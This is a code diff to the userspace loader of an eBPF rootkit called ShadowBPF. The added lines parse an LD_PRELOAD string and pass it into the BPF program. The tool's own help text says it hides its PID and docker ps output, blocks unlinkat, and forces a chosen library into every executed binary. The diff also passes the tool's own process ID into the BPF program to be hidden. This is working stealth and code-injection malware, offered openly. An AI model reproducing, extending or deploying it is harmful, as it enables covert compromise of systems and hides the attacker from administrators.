@@ -7,6 +7,7 @@
 #include <string.h>
 #include <fcntl.h>
 #include <errno.h>
+#include <argp.h>
 #include <bpf/bpf.h>
 #include <bpf/libbpf.h>
 #include <sys/resource.h>
@@ -81,6 +82,51 @@ static int handle_event(void *ctx, void *data, size_t data_sz)
     return 0;
 }
 
+static struct env {
+    char ld_preload[LD_PRELOAD_MAX_LEN];
+} env;
+
+const char *argp_program_version = "shadow 1.0";
+const char argp_program_doc[] =
+"ShadowBPF\n"
+"\n"
+"Removes output from docker -ps, hides pid, destroys unlinkat and LD_PRELOAD every execve'd binary\n"
+"USAGE ./shadow -l 'LD_PRELOAD string'\n"
+"EXAMPLES:\n"
+"LD_PRELOAD fakelib:\n"
+"   ./shadow -l 'LD_PRELOAD=/path/to/fakelib.so'"
+"";
+
+static const struct argp_option opts[] = {
+    {"ld_preload", 'l', "LD_PRELOAD", 0, "Full LD_PRELOAD string"},
+    {},
+};
+
+static error_t parse_arg(int key, char *arg, struct argp_state *state)
+{
+    switch(key) {
+        case 'l':
+            if (strlen(arg) >= LD_PRELOAD_MAX_LEN) {
+                fprintf(stderr, "LD_PRELOAD must be less than %d characters for eBPF stack limit\n", LD_PRELOAD_MAX_LEN);
+                argp_usage(state);
+            }
+            strncpy(env.ld_preload, arg, strlen(arg));
+            break;
+        case ARGP_KEY_ARG:
+            argp_usage(state);
+            break;
+        default:
+            return ARGP_ERR_UNKNOWN;
+    }
+    return 0;
+}
+
+static const struct argp argp = {
+    .options = opts,
+    .parser = parse_arg,
+    .doc = argp_program_doc,
+};
+
 int g_pid;
 
 int main(int argc, char *argv[])
@@ -88,6 +134,10 @@ int main(int argc, char *argv[])
     struct shadow_bpf *skel = NULL;
     struct ring_buffer *rb = NULL;
     int err;
+
+    err = argp_parse(&argp, argc, argv, 0, NULL, NULL);
+    if (err)
+        return err;
 
     /* do common setup */
     if (!setup())
@@ -100,11 +150,15 @@ int main(int argc, char *argv[])
         goto cleanup;
     }
 
+    /* pass in our pid to be hidden */
     char pid_to_hide[MAX_PID_LEN] = { 0 };
     g_pid = getpid();
     sprintf(pid_to_hide, "%d", g_pid);
     strncpy(skel->rodata->pid_to_hide, pid_to_hide, sizeof(skel->rodata->pid_to_hide));
     skel->rodata->pid_to_hide_len = strlen(pid_to_hide) + 1;
+
+    /* pass in our ld_preload if given one */
+    strncpy(skel->rodata->ld_preload, env.ld_preload, sizeof(skel->rodata->ld_preload));
 
     /* load and verify BPF program */
     err = shadow_bpf__load(skel);
